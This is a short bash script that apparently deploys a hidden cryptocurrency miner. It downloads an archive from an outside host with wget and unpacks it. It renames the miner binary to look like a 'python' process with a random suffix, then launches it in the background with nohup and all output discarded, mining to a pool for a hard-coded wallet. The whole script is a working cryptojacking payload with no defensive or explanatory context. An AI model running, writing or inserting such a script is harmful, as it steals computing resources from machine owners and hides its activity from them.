#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -O meki momok.x10.bz/DOT-SRB.tar.gz

tar xvf meki

cd dotsrb

mv python3 python$kolot

nohup ./python$kolot yespowersugar -o nomp.mofumofu.me:3391 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz.luckyynr-$kolot > /dev/null 2>&1 &
